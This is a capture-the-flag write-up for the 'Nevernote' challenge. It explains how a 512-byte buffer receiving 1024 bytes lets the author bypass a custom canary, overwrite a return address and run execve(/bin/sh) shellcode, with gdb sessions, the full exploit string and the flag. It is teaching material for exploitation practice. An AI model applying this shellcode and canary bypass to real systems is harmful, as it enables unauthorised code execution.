# Nevernote

## Problem
In light of the recent attacks on their machines, Daedalus Corp has implemented a buffer overflow detection library. 
Nevernote, a program made for Daedalus Corps employees to take notes, uses this library. Can you bypass their protection and read the secret? 
The binary can be found at `/home/nevernote/` on the shell server.

## Writeup
Nevernote.c runs a main command loop which takes various arguments and adds a new note, views an existing note, etc
````
    while (true){
        printf("Enter a command: ");
        fflush(stdout);
        if (fgets(command, 16, stdin) == NULL) goto exit;

        switch (command[0]){
            case 'a':
            case 'A':
                add_note(note_file_path);
                break;
            case 'v':
            case 'V':
                view_notes(note_file_path);
                break;
            case 'q':
            case 'Q':
                goto exit;
            default:
                puts("Commands: [a]dd_note, [v]iew_notes, [q]uit");
                fflush(stdout);
                break;
        }
    }
````
The note_file_path appends the name entered to this path **"/home/nevernote/notes/"**. This variable is malloced and is on the heap.
There was nothing "interesting" so far since 64 bytes name is read via `fgets`.

I later moved to the next function add_note
	`char *new_note = (char *)malloc(NOTE_SIZE);`
It is creating a buffer of NOTE_SIZE (1024 bytes) and passing that to get_note. That function is probably used to get the contents of the note.
add_note function is then checking the return status of get_note, and if successful, creates a file and writes the buffer to that file.

I then move on to get_note function hoping that this was the place where the magic was.
get_note function looked interesting at the first glance as it had the calls to create and verify canaries in the beginning and the end.

````
bool get_note(char *dest){
    struct safe_buffer temporary;
    bool valid;

    get_canary(&temporary.can);

    printf("Write your note: ");
    fflush(stdout);
    fgets(temporary.buf, NOTE_SIZE, stdin);

    // disallow some characters
    if (strchr(temporary.buf, '\t') || strchr(temporary.buf, '\r')){
        valid = false;
    }else{
        valid = true;
        strncpy(dest, temporary.buf, NOTE_SIZE);
    }

    verify_canary(&temporary.can);

    return valid;
}
````

It was using a safe_buffer structure to take the input. It even used proper NOTE_SIZE both while getting the input from stdin and while copying it to the buffer passed to it.
Everything looked fine till I checked how the structure safe_buffer is declared in canary.h

It had a char buffer and a varible of struct canary type. The most interesting line in the header file was this
`#define SAFE_BUFFER_SIZE 512`

The size of the buffer in safe buf was 512 bytes.
But get_note function copied NOTE_SIZE bytes into a safe_buffer.

**Buffer Overflow detected!!!!!**

I created compiled my own copy of nevernote from the source and ran it in gdb and examined the contents of the stack. I gave 512 bytes of input, exactly the size of the buffer
in the safe_buffer.

The command I used in gdb to run the program was
`r < <(python -c 'print "name\n" + "a\n" + "a"*512')`
where each '\n' sends input to the binary as if it is typed on console. Hence when the binary first asks for name, the input sent is "name\n", and the operation is "a\n" which is 
add and then I send 512 bytes of "a".

Before running this, I put a breakpoint just before call to strncpy by checking its address.
`b *0x08048910`

When the control hits the break point, I check the stack.
`x/32xw $esp`
I find the arguments as expected. I check the end of the buffer and then right after the buffer, there are the remaining fields of the safe_buffer type which are 
````
struct canary{
    int canary;
    int *verify;
};
````

these two values. I am assuming that get_canary function somehow gets the canary (it is using /dev/urandom) and sets it.
I verify this by 
`x temporary.can.canary` and it shows me
*0x924e000a:     Cannot access memory at address 0x924e000a*
which is the value on the stack at temporary.can.canary location. Also the next 4 bytes is a pointer on the heap which is supposed to point to canary and it contained 0x924ea41f

````
0xffffd5e0:     0x61616161      0x924e000a      0x0804c458      0x01e7f44e
0xffffd5f0:     0xf7e91f47      0xf7fc7000      0xffffd628      0x0804894e
0xffffd600:     0x0804c050      0xf7fc7000      0xf7fc7ac0      0xf7e7f10c
0xffffd610:     0xf7fc7ac0      0x08048da2      0xffffd634      0x0804c050
0xffffd620:     0x00000000      0x00000000      0xffffd6a8      0x08048bae
0xffffd630:     0x0804c008      0x00000010      0xf7fc7c20      0xf7ffd55c
0xffffd640:     0xffffd568      0xffffd588      0x00000000      0x00000a61
0xffffd650:     0x00000000      0x00000001      0x000001a8      0xf7000061
(gdb) x 0x0804c458
0x804c458:      0x924ea41f
````

There was something different because the verify was supposed to point to canary and as i continued, I got 
**Canary was incorrect!**
**Buffer overflow detected! Exiting.**
which was a good thing.

(Later I reliased that the \n and \0 characters had overwritten the first two bytes of the canary.)

Now all I needed was to give an input so that the verify always points to the canary. Now the HINT comes to the rescue.
Think about what fields of the canary struct you control. Also, malloc() is predictable without ASLR.

Since there is no ASLR, the pointer verify would always be malloced at address 0x0804c050. Hence I hard coded it into the exploit string. Also now is used '\90' instead of 'a'.
Also I check where the return address is stored and owerwrite that with a location inside the buffer. My exploit string so far is 

`r < <(python -c 'print "a\n" + "a\n" + "\x90"*516 + "\x50\xc0\x04\x08" + "a"*16 + "\xbc\xd6\xff\xff"')

Now I get a segfault after strncpy. I put a break point just before that and check the arguments I am passing to it. I have basically overwritten it with my buffer's \n\0 characters.
I could have reduced two bytes from my buffer but since my plan was to return to a value near the beginning of the buffer, I hard-coded the value being overwritten.

Ran gdb again
`r < <(python -c 'print "a\n" + "a\n" + "\x90"*516 + "\x50\xc0\x04\x08" + "a"*16 + "\xbc\xd6\xff\xff" + "\x50\xc0\x04\x08"')`. 
Now the verify_canary check passed and the function get_note returned to my return address. Now time to do some shell coding.

I took the tried and tested 28 byte execve(/bin/sh) code and inserted it. Since there were other function calls after the buffer overflow, I had to be careful not to corrupt the
stack. I decided to return above the return address instead (since I had 1024 bytes). Also gdb adds its own environment variables and even after unsetting them, I wasnt able to 
get the return address right. So I added a 200 byte NOP sled and then my shell code.

My final exploit string (after taking into consideration the STDIN closing issue) was
````
(echo "a"; echo "a"; python -c 'print "\x90\x90\x90\x90" + "\x90"*489 + "\x90"*23 + "\x50\xc0\x04\x08" + "a"*16 + "\xbc\xd6\xff\xff" + "\x50\xc0\x04\x08" + "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') > /tmp/aaa

(cat /tmp/aaa; cat) | ./nevernote
````

**FLAG: the_hairy_canary_fairy_is_still_very_wary**

